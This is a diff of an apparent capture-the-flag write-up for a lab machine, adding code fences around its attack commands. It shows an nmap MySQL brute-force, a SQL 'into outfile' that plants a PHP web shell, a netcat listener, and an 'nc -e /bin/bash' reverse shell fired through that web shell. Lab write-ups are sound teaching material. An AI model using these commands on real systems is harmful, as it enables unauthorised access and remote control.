@@ -30,9 +30,9 @@ Port 8 is a default apache install, so we move next to port 8080 which promises 
 So our first major breakthrough comes when we enumerate the open Mysql port and see that it allows remote connections (In that it at least checks our passwords rather than kicking us out right away)
 
 using this nmap script:
-
+```
     nmap --script=mysql-brute 10.0.2.13
-
+```
 we can brute force some simple mysql logins and come up with a valid username and password combination which we can use to login to myself with (Click the below screenshot to enlarge if you need to)
 
 [<img src="{{ site.baseurl }}/images/dusk/4.png"
@@ -49,9 +49,9 @@ Nothing! the database is just empty except for the mysql root user, which isn't 
  style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/6.png)
 
  the command for this in copyable format:
-
-    select "<? php system($\_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
-
+```
+    select "<? php system($_GET['cmd']); ?>" into outfile "/var/tmp/alickshell.php"
+```
 and we can now revisit the listing on port 8080 to see if it has saved:
 
 [<img src="{{ site.baseurl }}/images/dusk/8.png"
@@ -63,13 +63,13 @@ give it a quick check:
  style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/7.png)
 
 and then we can try and execute something intrusive. launch a netcat listener with
-
+```
     nc -lvp 4444
-
+```
 and then call the script from the server and tell it to connect to our listener:
-
+```
     index.php?cmd=nc -e /bin/bash 10.0.2.5 4444
-
+```
 [<img src="{{ site.baseurl }}/images/dusk/7_b.png"
  style="width: 800px;"/>]({{ site.baseurl }}/images/dusk/7_b.png)    
 
@@ -87,9 +87,9 @@ and we can navigate to our first user flag:
  ## Our first user pivot
 
 When we run:
-
+```
     sudo -l
-
+```
 We can see what our user can do to escape into another user:
 
 [<img src="{{ site.baseurl }}/images/dusk/11.png"
